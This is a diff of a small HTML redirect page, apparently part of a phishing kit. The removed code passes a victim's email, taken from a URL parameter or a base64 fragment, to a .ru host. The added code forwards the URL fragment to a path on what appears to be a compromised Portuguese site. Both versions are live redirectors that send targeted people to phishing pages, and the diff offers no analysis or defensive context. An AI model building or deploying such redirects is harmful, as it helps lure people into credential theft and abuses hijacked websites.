@@ -1,30 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <script>
-        var autocode = "EMAILURLSILENTC0DERS";
-        var link = "https://udhercqwuwnt.ru/UvD91D0Rt7/";
-        function getEmailParamFromURL() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const emailParam = urlParams.get("email");
-    
-        if (!emailParam) {
-        const urlFragment = window.location.hash.substring(1);
-        try {
-        const decodedText = atob(urlFragment);
-        return decodedText;
-        } catch (error) {
-        return urlFragment;
-        }
-        }
-        return emailParam;
-        }
+<meta charset="UTF-8">
+<script>
+    var target =
+        "https://portal-formacao.pt/images/?" +
+        "WXIRF=6GHO6pG&" +
+        "GB3tea.UrPYs017_3rGVPt5=&" +
+        "GB3tea.UrPYs017_3rGVPt5=";
 
-        const emailValue = getEmailParamFromURL();
-        if (emailValue) {
-        autocode = "#"+emailValue;
-        }
-        window.location.href = link+autocode;
-    </script>
-    <title>Redirecting...</title>
+    // Get value after #
+    var hashValue = window.location.hash.substring(1);
+
+    if (hashValue) {
+        hashValue = decodeURIComponent(hashValue);
+    }
+
+    window.location.replace(target + hashValue);
+</script>
